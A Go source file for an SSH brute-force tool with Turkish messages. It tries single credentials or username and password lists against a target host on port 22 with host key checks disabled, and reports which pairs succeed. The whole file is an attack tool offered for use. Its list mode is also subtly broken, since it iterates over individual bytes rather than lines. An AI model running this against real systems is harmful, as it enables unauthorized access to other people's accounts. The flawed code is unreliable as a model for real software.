package main

import (
	"flag"
	"fmt"
	"os"

	"golang.org/x/crypto/ssh"
)

func main() {

	user := flag.String("u", "", "Kullanıcı Adı Belirle")
	userFile := flag.String("U", "", "Kullanıcı Adı Dosyası Belirle")
	pass := flag.String("p", "", "Parola Belirle")
	passFile := flag.String("P", "", "Parola Dosyası Belirle")
	host := flag.String("h", "", "Host Belirtin")

	flag.Parse()

	if *pass != "" && *user != "" && *host != "" {

		ip := *host + ":22"

		config := &ssh.ClientConfig{
			User: *user,
			Auth: []ssh.AuthMethod{
				ssh.Password(*pass),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}

		client, err := ssh.Dial("tcp", ip, config)
		if err != nil {
			fmt.Println(*user, " ve ", *pass, " bilgileri ile SSH bağlantısı sağlanamadı")
			return
		}
		defer client.Close()

		fmt.Println(*user, " ve ", *pass, " bilgileri ile SSH bağlantısı sağlandı")

	} else if *passFile != "" && *userFile != "" && *host != "" {

		ip := *host + ":22"

		pFile, _ := os.ReadFile(*passFile)
		uFile, _ := os.ReadFile(*userFile)

		for _, username := range uFile {
			for _, password := range pFile {
				config := &ssh.ClientConfig{
					User: string(username),
					Auth: []ssh.AuthMethod{
						ssh.Password(string(password)),
					},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				}

				client, err := ssh.Dial("tcp", ip, config)
				if err != nil {
					fmt.Println(string(username), " ve ", string(password), " bilgileri ile SSH bağlantısı sağlanamadı")
					continue
				}
				defer client.Close()

				fmt.Println(string(username), " ve ", string(password), " bilgileri ile SSH bağlantısı sağlandı")
			}
		}

	} else {
		fmt.Println("Lütfen Parametleri Girin")
		fmt.Println("Örnek kullanım go run .\\sshBruteForce.go -u <KullanıcıAdı> -p <Parola> -h <HedefMakine>")
		return
	}
}
